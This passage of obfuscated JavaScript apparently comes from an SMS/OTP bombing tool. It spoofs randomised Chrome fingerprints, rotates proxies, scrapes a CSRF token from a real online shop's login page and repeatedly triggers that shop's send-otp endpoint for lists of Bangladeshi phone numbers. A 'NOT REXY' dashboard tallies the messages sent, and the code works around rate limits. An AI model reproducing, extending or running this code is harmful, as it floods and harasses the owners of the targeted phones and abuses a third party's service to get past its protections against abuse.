'4PscifVIGkjDifLVDxiGsfDjrca6ia', 'DxnLCKfNzw50', 'Dg90ywXoDw1IzxjZ', 'y2HYB21LvMvYC2LVBG', 'zxHPC3rZu3LUyW', 't1zjrwe', 'DMvYC2LVBG', 'igHPDhmk', 'g1SWBq', 'DfDrDwu', 'zMLSzq', 'sfbvB3G', 'y29WEq', 'B2rgA1q', 'iK5VDcbbkejYyw5KiJT2psi4iG', 'u2f2zsb0AgLZigTLEsbMB3iGzNv0DxjLihvZzt8', 'y291BNrYEq', 'wuXZs2K', 'C21ZyM93zxi', 'svbYwwO', 'ExLpu2K', 'mdaWmdaWmdaWmdaWmdaWma', 'BMv4yq', 'swHXAeS', 'icbB', 'ChjPB3jPDhK', 'tw96AwXSys81lJaGke1Hy2LUDg9ZAdSGsw50zwWGtwfJie9tifGGmtbFmtvFnYKGqxbWBgvxzwjlAxqVntm3lJm2icHlsfrntcWGBgLRzsbhzwnRBYKGq2HYB21LlW', 'swTjzNu', 'BM9Uzq', 'nZbXDuXXwKy', 'CMjpAxq', 'u2nYyxbLCIblAw5N', 'uLfYy20', 's1n6twG', 'Bwv0Ag9K', 'ywrK', 'q1nsrIbnAxnTyxrJAcaOnde5ksdIGjqGu2vZC2LVBIbLEhbPCMvKlcbYzxrYEq', 'otGWntmWnhHdr3vzAG', 'iIWGiKnOCM9TAxvTiJT2psi', 'twf4ihbYAwnLihbLCIbUDw1IzxiGw2rLzMf1Bhq6idaUnv06', 'wMfxz08', 'uMfUz2uGrMLUzgvYig1Vzgu6', 'cIaG4PYxifnLC3nPB24GAw52ywXPzgf0zwqGyNKGC2vYDMvYicHRAwXSks4GrxHPDgLUzY4UlGO', 'v2PkBeC', 'DNHer0O', 'C2vJq2Hvyq', 'sK52uvy', 'zhv0EwzYzwvIzc5JB20G4Ocuie9uua', 'wwvZlcbHzgqGyw5VDgHLCIbYyw5Nzq', 'vLfnBNa', 'vgHYzwfKCYa', 'jMfJDgLVBJ1ZzxrtDgf0DxmMAwq9', 'BMv3', 'cIaG4PYxieHxsuqGAw50zwDYAxr5ignOzwnRigzHAwXLzc4GvgfTCgvYAw5NigrLDgvJDgvKlGO', 'BMfTzq', 'B3rW', 't2HTEva', 'C2vYDMLJzq', 'jg1Iid0GkeDLDc1dAw1jBNn0yw5JzsbxAw4ZmL9cyxnLqM9HCMqGluvYCM9Yqwn0Aw9UifnPBgvUDgX5q29UDgLUDwuPlLnLCMLHBe51BwjLCJSG', 'cIaG4PYxieLUDMfSAwqGu2vYDMvYifjLC3bVBNnLoIbnAxnZAw5NiefJDgL2zsbtzxnZAw9UifrVA2vUlIbbyM9YDgLUzY4k', 'C2vJq2HvyvbSyxrMB3jT', 'yxbPx2TLEt0', 'AxLTyNq', 'uwDuuuK', 'wMvUzxG6ig5Vig51BwjLCG', 'vvrvtMq', 'sg93ig1HBNKGBNvTyMvYCZ8Gw2rLzMf1Bhq6iduWxtO', 'Dg90ywXTzw0', 'DhLWzq', 'Dxr5z2K', 'iK5VDd1bp0jYyw5KiJT2psi4iG', 'BMLK', 'uffnELq', 'C3rHCNruAw1L', 'zgf0yq', 'wvPezvq', 'BwfWAwTLEq', 'A2v5ChjLC3m', 'zNvSBf9UDw1Izxi', 'AgL0CW', 'yxbWBgLJyxrPB24VEc13D3CTzM9YBs11CMXLBMnVzgvKoYbJAgfYC2v0pvvurI04', 'sLbishO', 'wM1wyum', 'yKvzruW', 'icdILAdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILAm', 'u2vSzwn0ihjHBMDLCZO', 'u0vmrunuie5vtujfuIbtt1vsq0u', 'g1SYsHTBm0OBw0G', 'z2P3r0S', 'Ahr0Chm', 'cIaG4PYxieXPy2vUC2uGDMvYAwzPy2f0Aw9UigzHAwXLzc4GrxHPDgLUzY4k', 'lJaU', 'BfjXEfK', 'EwvSBg93', 'u1rbvfvtx09loG', 'u2vYDMvYidmGkc9WmY9NzxqP', 'rM5Qy1O', 'yxbPs2v5', '4PscifVIGkjDifrLBgvNCMfTica6ia', 'CMvTB3zLx3bSDxm', 'u1rbvfvtx1DbsvrFuKvuuLK6', 'DK9TCKi', 'vg90ywWGvgLTzq', 's2D1uhK', 'tgLJzw5Zzwq', 'jNn0yxr1CZ0', 'BNvSBa', 'iM1Hy09tiG', 'ChjVDMLKzxi', 'qundrvntx05vtujfuJO', 'C29JA3m0', 'g1SYsW0k', 'g1SWBsa', 'v1b2rxO', 'rMX4r3C', 'cIaGw1jHBMDLiezPBMrLCL0GrMv0y2HPBMCGBgL2zsbJB25ZB2XLigzLzwqUlI4', 'C2v0vgLTzw91Da', 'cIaG4PYxie5VigHPDhmGAw4Gy29UC29SzsbMzwvKlGO', '4PscifVIGkjDief1DgHVCIaGica6ia', 'mM9VotOGvgLTzw91Da', 'zw5K', 'vM9SDhGG4PQH', 'ywrKtg9N', 'oI8V', 'C2vJlwnOlxvH', 'uhjLBwL1BsbmAwnLBNnLicaGicaGicaGicaGica', 'wwvZlcb1C2uGC2f2zwqGA2v5', 'BwfW', 'y3jLyxrLsgfZAa', 'sg5zwvu', 't1rqifnLBNq', 'C2vJlwzLDgnOlxvZzxi', 'A1bssuO', 'tM8SihbYB2nLzwq', 'C2LyDxG', 'sxbgruW', 'yw5KCM9Pza', '4QYf77IpieDViejHy2SGDg8GtNvTyMvYCYbtzwXLy3rPB24', 'zgDgveG', 'l01yuZq3rKXgwdbvl3rUzxzZl0bWDwjSAwmVyxbPl2nVBNnVBgu', 'z2v0ugf0Aa', 'DuzOyNG', 'BNvTyMvY', 'uMvTB3zLihnHDMvKigTLEq', 'q2XJqNC', 'B3jPz2LU', 'yxbWBgLJyxrPB24VANnVBIWGDgv4Dc9QyxzHC2nYAxb0lcaQlYO7ihe9mc4Wmq', 'C3rHDhvZq29Kzq', 'icbevvrziezsruuGqKqGt1rqifrssuDhrviG4OcuienptvbmrvrficaGicaGia', 'u1Dmsfe', 'CMvZDw1L', 'wMvUzxG6igLUDMfSAwqGsLnptG', 'ugzSBu4', 'y291BNq', 'i0zgndq2nG', 'uffYsLK', 'Ahr0CdOVlW', 'DMfSDwu', 'zLrzwhm', 'mM9VotOGtM8GBNvTyMvY', 'iKDVB2DSzsbdAhjVBwuIo3y9iG', 'D2LUmZi', 'icaGg1SZm20', 'vhvIBLe', 'u0vmrunuie5fweeGu0vsvKvs', 'Dufbqvy', 'sNfTwe8', 'mM9VosbUzxr3B3jRoIa', 'iK5VDcHbo0jYyw5KiJT2psi4iG', 'zKrJrNK', 'yxbWzw5KrMLSzvn5BMm', 'EwvZ', 'uNnNyuS', 'CM91BMq', 'y1bhCMq', 'wgf5AM0', 'yNvPBgrnAw4', 'rfrguKvflvyXlJaUmcaGicaGicaGicaGicaGica', 'rMfPBgvK', 'mc41', 'tLDyBMS', 'rw50zxiGBMv3igTLEq', 'cIaG4PYxie5VihzHBgLKihjHBMDLCY4k', 'u2vYDMvYideGkc9NzxqP', 'iokCPIbty3jHCgvYieTPBMC', 'vKHNqxC', 'zu5QtKK', 'iK5VDd9bx0jYyw5KiJT2psi5osi', 'iIWG', 'icHLlMCUidaXnZK2wfHywfGPig9YicDIywnRjZO', 'vMvYAwz5Aw5NieXPy2vUC2uUlI4GicaGicaGica', '4P2miev4AxqGuhjVz3jHBq', 'zM9YBwf0', 'sgvyAgS', 'rw50zxiGu01tiejVD2vYiefqssblzxK6', 'DgLTzw91Da', 'ChjVEgLLCY50Ehq', 'twzbwwm', 'lIbbzgqGyw5VDgHLCJ8', 'odGW', 'rw50zxiGtNvTyMvYCYbgAwXLifbHDgG6', 'uNvUigfNywLUpW', 'wMLZAfC', 'icdILOJILOJILOJILOJILOJILOJILztILz3ILzRILOJILOJILOJILOJILOJILOJILztILz0GicdILOJILOJILzeGicaGicdILOJILOJILzeGica', 'rLD4wK8', 'Ahr0Chm6lY9KDxr5zNjLzwjKlMnVBs9Zzw5Klw90Ca', 'C3rYAw5N', 'mtG4lJeZnY4XnZyUmtyZ', 'icaGicaGicaGicaGicaGicaGicaGica', 'qwrKzwqG', 'wMLWqNK', 'zgvIDq', 'ALzjr2O', 'q29UC29SzsbMzxrJAcbMywLSzwq', 'iokgKIa', 'z3PPCcWGzgvMBgf0zsWGyNi', 'AvPYCee', 'kcGOlISPkYKRksSK', 'q291BgqGBM90igv4DhjHy3qGq1nsrIb0B2TLBIbMCM9TigXVz2LUihbHz2u', 'C3rKAw4', 'rhzet1K', 'sNHmCeO', 'cIaG4PYxierPC2nVBM5Ly3rLzcbMCM9TieXPy2vUC2uGu2vYDMvYlIbfEgL0Aw5NlI4UcG', 'rw1guw4', 'vuztvLa', 'u2vYDMLJzsbJB2rLicHLlMCUigrMlcbMyIWGD2ePifTKzwzHDwX0oIbKzL06', 'qZPCv2LUzg93C1XtExn0zw0ZmLXxAw5KB3DZug93zxjtAgvSBfX2ms4WxhbVD2vYC2HLBgWUzxHLic1oB1bYB2zPBguGlunVBw1HBMqGiG', '4Psm4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psq', 'y2HHBgS', 'zw5XDwv1zq', 'Dt0XlcbP', 'C29YDa', 'l3bYB2mVy3b1Aw5MBW', 'mty2meH1sgrYBq', 'BM9YBwfS', 'z3PPCa', 'rKfuquW6ieLUDMfSAwqGChjVEhKU', 'CMnTseu', 'CwjPBhm', 'uvvise0', 'u21ZqM93zxiGDgLTzw91Da', 'twzmCMm', 'BM9FCgX1C19UDw1Izxi', 'y29UDgvUDc1LBMnVzgLUzW', 'zgvMBgf0zq', 'DgvZDa', 't0zlB0G', 'C3rHDgvpyMPLy3q', 'y291BNrLCG', 'l3n0DwjZl2HHBMrSzxjFyxbPlNbOCd8', 'Au5Tr28', '4P2miev4Axq', 'wZiVmL0Gu2vUzgLUzYbpvfaGDg8G', 'AgvHzgvYCW', 'jgrPC2SGpsaOr2v0lunPBuLUC3rHBMnLifDPBJmYx0XVz2LJywXeAxnRic1gAwX0zxiGj0rLDMLJzuLepvWNqZPCjYCGluvYCM9Yqwn0Aw9UifnPBgvUDgX5q29UDgLUDwuPlLzVBhvTzvnLCMLHBe51BwjLCJSG', 'CxvLDwu', 'icaGg1SZnM3INPqBwZm1Bsa', 'C29JA3mTChjVEhKTywDLBNq', 'wwvZlcbZyxzLigL0', 'C2v0sw50zxj2ywW', 'B0DlufO', 'Dgv4Dc9ODg1SlgfWCgXPy2f0Aw9Ul3HODg1Sk3HTBcXHChbSAwnHDgLVBI94BwW7Ct0WlJKSAw1Hz2uVyxzPzIXPBwfNzs93zwjWlgLTywDLl2fWBMCSkI8Qo3e9mc44lgfWCgXPy2f0Aw9Ul3nPz25Lzc1LEgnOyw5NztT2pwiZo3e9mc43', 'AxnuvfK', 'z3jLzw5cCMLNAhq', 'we1mshr0CfjLCxvLC3q', 'yvb6ExO', 'E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK', 'DxbNCMfKzs1PBNnLy3vYzs1Yzxf1zxn0CW', 'CgfZCW', 'q29UC29SztOGsw52ywXPzcbku09o', 'CMvWBgfJzq', 'BfbgzKS', 'A2zhyMe', 'EMnUree', 'ywDLBNq', 'v0nUDNK', 'iZG4odG4oa', 'Aw5MBgf0zvn5BMm', 'r0vu', 'Eg5cA3q', 'C2v0lwnVB2TPzq', 'cIaG4PYxie5LDhDVCMSGzxjYB3iGzhvYAw5NihnLC3nPB24GCgLUzY4GrxHPDgLUzY4UlGO', 'ywXSu2v0DgXLza', 'Cfvstfq', 'yK9jvNO', 'EuLqAKe', 'C0PZtNu', 'CgHVBMvoDw1Izxi', 'Bunlsgy', 'A25kD2O', 'vuvhuu0', 'ihjHBMDLkhmPlIbbzgqGyw5VDgHLCJ8', 'DgLTzxn0yw1W', 'l2fWAs92zxjPzNK', 'tgX4reW', 'CKzTq0e', 'CMfUz2u', 'C2v0u3rHDhvZ', '4PQHief1Dg8GzMv0y2GGzNjVBsbwB2X0EcaOmM9VosK', 'CMvHC29U', 'cIaG4PYxienVDwXKig5VDcbNzw5LCMf0zsbiyxjKD2fYzsbjrc4GuNvUig9UifDPBMrVD3mUcG', 'jM1HEfbYAwnLpq', 'y3vZDg9T', 'EeTqtLy', 'C2vHCMnO', 're5QAfG', 'AxnbCNjHEq', 'zLD2wxm', 'ifnHzMfYAs81mZCUmZy', 'icaGicaGia', 'zwr0wuK', 'A2LbCxi', 'yxbWBgLJyxrPB24VANnVBG', 'zLvtq0S', 'iK5VDd1bx0jYyw5KiJT2psi5osi', 'DgHLBG', 'icaO', 'AhDPza', '4QYf77IpieDViejHy2SGDg8GqvbjieTLEq', 'wKzdteC', 'BLvpwvy', 'ChjVEhK', '4PscifVIGkjDifn0yxr1CYaGica6ia', 'mta1mJe3ofLsC3z4vG', 'iokgUYbty3jHCgvYieTPBMC', 's1vOyKO', 'CMfUzg9T', 'zxHWAxjLza', 'cIaG4PYxieLUDgvYBMfSifnLCNzLCIbfCNjVCIaOntaWks4GugXLyxnLihrYEsbHz2fPBIbSyxrLCI4k', 'y3b1CW', 'u3vJy2vZC2z1Ba', 'Ec1JC3jMlxrVA2vU', 'qurND1u', 'iLDPBMrVD3mI', 'C3rYAw5NAwz5', 'yvnIwLa', '8j+tIIbtAg93ihrVCca1icyGC2vSzwn0', 'rw50zxiGCMfUz2uGiW', 'lI4U', 'iZmZmZmZmW', 'CMvK', 'r2HcEfa', 'tNzWrNK', 'whPMt1u', 'ihWG', 'w1nfvfvqxsbezxbLBMrLBMnPzxmGAw5ZDgfSBgvKihn1y2nLC3nMDwXSEsek', 'C3rLEf9RzxKUDhH0', 'DK96sgm', 'A0DTrKm', 'C3vIC3rYAw5N', 'ks4GvxnLigL0pW', 'CMrPv0e', 'C2vJlwzLDgnOlw1Vzgu', 'Dg9vChbLCKnHC2u', 'rhv0EuzYzwuGqKqG4Ocuie9uucbuCMLNz2vYicaGia', 'qMrPquO', '8j+tSsbbDxrVigzLDgnOigzYB20Gu01tiejVD2vY', 'Ahr0Chm6lY9KDxr5zNjLzwjKlMnVBs9SB2DPBI1VDha', 'zw4TvvmSzw47Ct0WlJK', 'l3yXl2DLDg51Bq', 'CMvHzezPBgvtEw5J', '4PYp77IpicbfBNrLCIbTyw51ywXSEq', 'tuXwwMG', 'Ahr0Ca', 'iZu1ntu1nq', 'vezVwhu', 'CMvWzwf0', 'Bwf1DgHHCgK', 't2XlCNK', '4QYf77IpieDViejHy2S', 'icdILzRILzdILzdILzdILzdILzdILz0GiokvMUkvKokvKokvKokvKokvKokvNsaGicdILzRILzdILz0GicaGicdILzRILzdILz0Gicak', 'i0zgnKiZnq', 'tK9FqunusvzbveLptG', 'ufjZqwW', 'CMvTB3zL', 'CMvSzwfZzq', 'x3bYB2nLC3m', 'Bw9jB3u', 'y29Kzq', 'y29UDgvUDc10ExbL', 'icaGifbSzwfZzsbJAgvJAYb5B3vYigLUDgvYBMv0ignVBM5Ly3rPB24GB3iGDhj5igfNywLUigXHDgvYlGO', 'cIaG4PYxifnLC3nPB24Gvg9Rzw4GBg9ZDc4GqwjVCNrPBMCUlI4k', 'C2v0DgLUz3mGz2v0ihnLy3vYzsbHBMrYB2LKx2LKidi+l2rLDI9UDwXSihX8igvJAg8GiIi', 'D2HPDgu', '4QYf77IpiejHy2S', 'sePeBxa', 'lI4Ukq', 'rM91BMqGC2f2zwqGqvbjieTLEsaOlI4U', 'CgfKrw5K', 'tK9uifjfr0Ltvevsruq', '8j+uHcbzzxmSihjLC3rHCNq', 'uwP1EMq', 'u2vYDMvYidiGkc9WmI9NzxqP', 'C2HPzNq', 'B3rWCW', 's21Jwu8', 'iefqssblzxKGkg1HDxrOyxbPktO', 'ALfxzgS', 'jMnVDw50CNK9', 'svbTyMG', 'AgzNB1G', 'y29VA2LLu3rY', 'rLbVr2W', 'v0jJChe', 'Ec1Yzxf1zxn0zwqTD2L0Aa', 'yKzMA2K', 'Cgf0Ag5HBwu', 'C3vJy2vZC2z1Ba', 'C09QCMC', 'te5KzuW', 'y1rUCNq', 'rNPwrMO', 'icdILiiGia', 'ywnJzxb0', 'C0HQvem', 'C21ZyM93zxjFA2v5lNr4Da', 'D2f3v1i', 'ywnJzxb0lwvUy29KAw5N', 'Fgr1DhLMCMvLFdeUmc4WFa', 'mtmYmtqWog1gENPcAG', 'reDvzee', 'DxzjChq', 'icdILzeGicaG4PYxifvoqvvuse9ssvPfrcbiqvjev0fsrsdIGjqGrfrguKvfifrpt0WGicaG4Pwr', 'q29UC29SzsbUzxr3B3jRoIa', 'y3nYzG', 'y2XVC2u', 'whD5rwm', 'mM9VotOGsw52ywXPzcbku09o', 'cIaG4PYxieXPy2vUC2uGC2vYDMvYigLZign1CNjLBNrSEsb1BMrLCMDVAw5Nig1HAw50zw5HBMnLig9YigLZihvUCMvHy2HHyMXLlG', 'y2jnDxy', 'twTwvLi', 'rw9JDeq', 'r05QCfa', 'icaGicaBwZKWBq', 'EejbteW', 'l01yuZq3rKXgwdbvl3rUzxnZl0bWDwjSAwmVyxbPl2DLDg51Bq', 'l01yuZq3rKXgwdbvl3rUzxzZl0bWDwjSAwmVyxbPl2DLDg51Bq', 'icaJicaGuMfUz2uGicaGicaGicaGicaGieHPDhm', 'vgLWuue', 'txjVCva', 'cIaG4PYtifnLBgvJDgvKoIa', 'Bwf4uhjPy2u', 'B3jPz2LUywW', 'y3nYzI1MzxrJAa', 'tMv4yu9uucbUzxr3B3jRoIa', 'DKz2y24', 'zw1WDhK', 'C3vJy2vZC2z1Bc50Ehq', 'tKXjDhC', 'ue9tva', 'Bwf0y2G', 'zw5KCg9PBNq', 'y3LHBG', 'v25kqLO', 'DezSD3m', 'rM5wruq', 'l2fWAs92ms9UDw1IzxjZl2DLDa', 'wen4vxG', 'mtiYnZzsANrsue4', 'BwvxD0i', 'l2fWAs9WAw5N', 'rgvSzxrLihnHDMvKigTLEq', 'Dc5Tzs9Zy3jHCgvYx2TPBMCGicaGicaGicaGica', 'C3rKB3v0', 'BMv4yw90ChnLCNzPy2uUy29T', 'wwvZ', '4Psu4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4PsycG', 'B1fvB0e', 'DePywwm', 'wZeVmL0Gr2v0DgLUzYbZzxnZAw9UicyGq1nsrIbMB3iG', 'uNLOwLG', 'wMvUzxGGDgLTzw91Da', 'iokuGIa', 'rxvfrvy', 'vgLTzw91Da', 'xcTCkYaQkd86w2eTEKeTwL8KxvSWltLHlxPblvPFjf0Qkq', '4PQHief1Dg8GzMv0y2GGzNjVBsbAzw5LEa', 'EMvUzxG', 'C2vSzwn0', 'D3jPDgu', 'C2v0uMf3tw9Kzq', 'D0DIr3i', 'zg93BG', 'yw9ly3i', 'uMf0zsbmAw1PDgvKicG0mJKPiokaLcbuB28GBwfUEsbYzxf1zxn0CYbMCM9TihrOAxmGsva', 'CMv0DxjUicHMDw5JDgLVBIGPia', '4PYp77IpicbdDxn0B20GrMLSzsbqyxrO', 'BgvUz3rO', 'iK5VDcLbo0jYyw5KiJT2psi5osi', 'AM9PBG', 'wNf2AwS', 'v2Xwq1i', 'ChjVy2vZC2LUzW'];
  fn1 = function () {
    return v143;
  };
  return fn1();
}
const v9 = {};
v9.v = 0x90, v9.buildMin = 0x1cf7, v9.buildMax = 0x1cfd, v9.grease = "\"Not(A;Brand\";v=\"8\"";
const v10 = {};
v10.v = 0x95, v10.buildMin = 0x1d4a, v10.buildMax = 0x1d7d, v10.grease = "\"Not)A;Brand\";v=\"24\"";
const v11 = {};
v11.v = 0x97, v11.buildMin = 0x1d88, v11.buildMax = 0x1dba, v11.grease = "\"Not=A_Brand\";v=\"99\"";
const v12 = {};
v12.v = 0x99, v12.buildMin = 0x1dc4;
v12.buildMax = 0x1df6, v12.grease = "\"Not_A Brand\";v=\"8\"";
const CHROME_VERSIONS = [v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12];
function getRandomClient() {
  const v144 = Math.random() < 0.65,
    v145 = v144 ? CHROME_VERSIONS.slice(-6) : CHROME_VERSIONS,
    v146 = v145[Math.floor(Math.random() * v145.length)];
  const v147 = Math.floor(Math.random() * (v146.buildMax - v146.buildMin + 0x1)) + v146.buildMin,
    v148 = Math.floor(Math.random() * 0xc8) + 0x1,
    v149 = Math.random() < 0.25;
  const v150 = !v149 && Math.random() < 0.5;
  let v151, v152;
  v149 ? (v151 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v146.v + ".0." + v147 + '.' + v148 + " Safari/537.36", v152 = "\"macOS\"") : (v151 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v146.v + ".0." + v147 + '.' + v148 + " Safari/537.36", v152 = "\"Windows\"");
  const v153 = {};
  v153.userAgent = v151, v153.secChUa = "\"Google Chrome\";v=\"" + v146.v + "\", \"Chromium\";v=\"" + v146.v + "\", " + v146.grease, v153.secChUaPlatform = v152;
  return v153.chromeVersion = v146.v, v153;
}
function parseProxy(v154) {
  if (!v154) return null;
  if (typeof v154 === "object") return v154;
  v154 = v154.trim();
  if (!v154) return null;
  let v155, v156, v157, v158;
  if (v154.includes("://")) v154 = v154.split("://")[0x1];
  if (v154.includes('@')) {
    const v160 = v154.split('@'),
      v161 = v160[0x0].split(':'),
      v162 = v160[0x1].split(':');
    v157 = v161[0x0], v158 = v161[0x1], v155 = v162[0x0], v156 = parseInt(v162[0x1]);
  } else {
    const v163 = v154.split(':');
    if (v163.length === 0x2) v155 = v163[0x0], v156 = parseInt(v163[0x1]);else {
      if (v163.length === 0x4) !isNaN(parseInt(v163[0x3])) && isNaN(parseInt(v163[0x1])) ? (v157 = v163[0x0], v158 = v163[0x1], v155 = v163[0x2], v156 = parseInt(v163[0x3])) : (v155 = v163[0x0], v156 = parseInt(v163[0x1]), v157 = v163[0x2], v158 = v163[0x3]);else v163.length === 0x3 && (v155 = v163[0x0], v156 = parseInt(v163[0x1]), v157 = v163[0x2]);
    }
  }
  if (!v155 || !v156) return null;
  const v159 = {};
  v159.type = "http", v159.host = v155;
  return v159.port = v156, v159.user = v157, v159.pass = v158, v159.original = v154, v159;
}
function createProxyAgent(v164) {
  if (!v164) return null;
  const v165 = typeof v164 === "string" ? parseProxy(v164) : v164;
  if (!v165) return null;
  if (v165.type === "socks5" || v165.type === "socks4") return new SocksProxyAgent("socks5://" + (v165.user ? encodeURIComponent(v165.user) + ':' + encodeURIComponent(v165.pass || '') + '@' : '') + v165.host + ':' + v165.port);
  return new HttpsProxyAgent("http://" + (v165.user ? encodeURIComponent(v165.user) + ':' + encodeURIComponent(v165.pass || '') + '@' : '') + v165.host + ':' + v165.port);
}
function sendRequest(v166, v167, v168, v169, v170 = null, v171 = 0x61a8) {
  return new Promise((v172, v173) => {
    const v174 = new URL(v166),
      v175 = {
        ...v168
      },
      v176 = v175;
    if (!v176["Accept-Encoding"]) v176["Accept-Encoding"] = "gzip, deflate, br";
    if (v169) v176["Content-Length"] = Buffer.byteLength(v169);
    const v177 = {};
    v177.hostname = v174.hostname, v177.path = v174.pathname + v174.search, v177.method = v167, v177.headers = v176, v177.timeout = v171;
    const v178 = v177;
    if (v170) {
      const v180 = typeof v170 === "object" ? v170 : parseProxy(v170);
      if (!v180 || isNaN(v180.port) || v180.port <= 0x0) return v173(new Error("FATAL: Invalid proxy."));
      v178.agent = createProxyAgent(v180);
    }
    const v179 = https.request(v178, v181 => {
      const v182 = [];
      v181.on("data", v183 => v182.push(v183));
      v181.on("error", v173), v181.on("end", () => {
        let v184 = Buffer.concat(v182);
        const v185 = v181.headers["content-encoding"];
        if (v185 === "gzip") try {
          v184 = zlib.gunzipSync(v184);
        } catch (v186) {} else {
          if (v185 === "deflate") try {
            v184 = zlib.inflateSync(v184);
          } catch (v187) {} else {
            if (v185 === 'br') try {
              v184 = zlib.brotliDecompressSync(v184);
            } catch (v188) {}
          }
        }
        v172({
          'status': v181.statusCode,
          'data': v184.toString("utf8"),
          'headers': v181.headers
        });
      });
    });
    v179.on("error", v173), v179.on("timeout", () => {
      v179.destroy(), v173(new Error("timeout"));
    });
    if (v169) v179.write(v169);
    v179.end();
  });
}
async function fetchSessionAndCsrf(v189, v190, v191 = 0x61a8) {
  const v192 = {};
  v192.accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
  v192["accept-language"] = "en-US,en;q=0.9", v192["accept-encoding"] = "gzip, deflate, br, zstd", v192["sec-ch-ua"] = v190.secChUa, v192["sec-ch-ua-mobile"] = '?0', v192["sec-ch-ua-platform"] = v190.secChUaPlatform, v192["sec-fetch-dest"] = "document";
  v192["sec-fetch-mode"] = "navigate", v192["sec-fetch-site"] = "none", v192["sec-fetch-user"] = '?1';
  v192["upgrade-insecure-requests"] = '1', v192["user-agent"] = v190.userAgent;
  const v193 = await sendRequest("https://dutyfreebd.com/login-otp", "GET", v192, null, v189, v191),
    v194 = v193.data.match(/<meta\s+name=["']csrf-token["']\s+content=["']([^"']+)["']/i),
    v195 = v194 ? v194[0x1] : null,
    v196 = v193.headers["set-cookie"] || [],
    v197 = [];
  for (const v201 of v196) {
    const v202 = v201.split(';')[0x0].trim();
    if (v202) v197.push(v202);
  }
  const v198 = v197.join(';\x20'),
    v199 = {};
  v199.status = v193.status, v199.csrf = v195, v199.cookies = v197, debugLog("session", "csrf-fetch", v199);
  const v200 = {};
  return v200.csrfToken = v195, v200.cookieStr = v198, v200;
}
async function triggerOTP(v203, v204 = {}) {
  const {
    onStatus = () => {},
    proxy = null,
    timeout = 0x61a8
  } = v204;
  const v205 = normalizeBDPhone(v203);
  const v206 = getRandomClient();
  try {
    onStatus("[1/2] Getting session & CSRF for " + v205 + "...");
    const {
      csrfToken: v207,
      cookieStr: v208
    } = await fetchSessionAndCsrf(proxy, v206, timeout);
    if (!v207) throw new Error("Could not extract CSRF token from login page");
    onStatus("[2/2] Sending OTP to " + v205 + "...");
    const v209 = "mobile_no=" + encodeURIComponent(v205),
      v210 = {};
    v210.accept = "application/json, text/javascript, */*; q=0.01", v210["accept-language"] = "en-US,en;q=0.9", v210["accept-encoding"] = "gzip, deflate, br, zstd", v210["content-type"] = "application/x-www-form-urlencoded; charset=UTF-8", v210.cookie = v208, v210.origin = "https://dutyfreebd.com", v210.priority = "u=1, i", v210.referer = "https://dutyfreebd.com/login-otp", v210["sec-ch-ua"] = v206.secChUa, v210["sec-ch-ua-mobile"] = '?0', v210["sec-ch-ua-platform"] = v206.secChUaPlatform, v210["sec-fetch-dest"] = "empty", v210["sec-fetch-mode"] = "cors", v210["sec-fetch-site"] = "same-origin", v210["user-agent"] = v206.userAgent, v210["x-csrf-token"] = v207, v210["x-requested-with"] = "XMLHttpRequest";
    const v211 = await sendRequest("https://dutyfreebd.com/send-otp", "POST", v210, v209, proxy, timeout);
    debugLog(v205, "otp-res", v211.data);
    let v212 = {};
    try {
      v212 = JSON.parse(v211.data);
    } catch (v213) {}
    if (v212.status === true) {
      onStatus("[2/2] ✅ OTP Dispatched");
      const v214 = {};
      return v214.success = true, v214.message = v212.message || "OTP Sent", v214.phone = v205, v214;
    } else {
      if (v211.status === 0x1ad) throw new Error("Rate Limited (429) — Too many requests from this IP");else {
        if (v211.status === 0x1a3) throw new Error("CSRF Mismatch (419) — Session expired, retry");else {
          const v215 = v212.message || v212.error || "Failed (HTTP " + v211.status + ')';
          throw new Error(v215);
        }
      }
    }
  } catch (v216) {
    const v217 = {};
    return v217.success = false, v217.message = v216.message, v217.phone = v205, v217;
  }
}
if (isMainThread) {
  class Dashboard {
    constructor(v218) {
      this.totalNumbers = v218;
      this.processed = 0x0, this.successful = 0x0;
      this.failed = 0x0;
      this.startTime = Date.now();
    }
    ["addLog"](v219, v220) {
      let v221 = '';
      if (v220 === "success") v221 = chalk.hex("#00A86B").bold(" ✦ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#00A86B")("OTP Sent") + chalk.hex("#555555")(" → ") + chalk.hex("#FFD700").bold(v219.replace("Triggered OTP for ", ''));else {
        if (v220 === "retry") v221 = chalk.hex("#FFD700").bold(" ↻ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FFD700")(v219);else {
          const v222 = v219.match(/0\d{9,10}/),
            v223 = v222 ? v222[0x0] : '',
            v224 = v219.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
          v221 = chalk.hex("#FF4466").bold(" ✗ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FF4466")(v223 ? '' + v223 : '') + chalk.hex("#555555")(v223 ? " → " : '') + chalk.hex("#888888")(v224);
        }
      }
      process.stdout.write("\r[K" + v221 + '\x0a'), this.render();
    }
    ["setStatus"](v225) {}
    ["render"]() {
      const v226 = this.processed / Math.max(this.totalNumbers, 0x1),
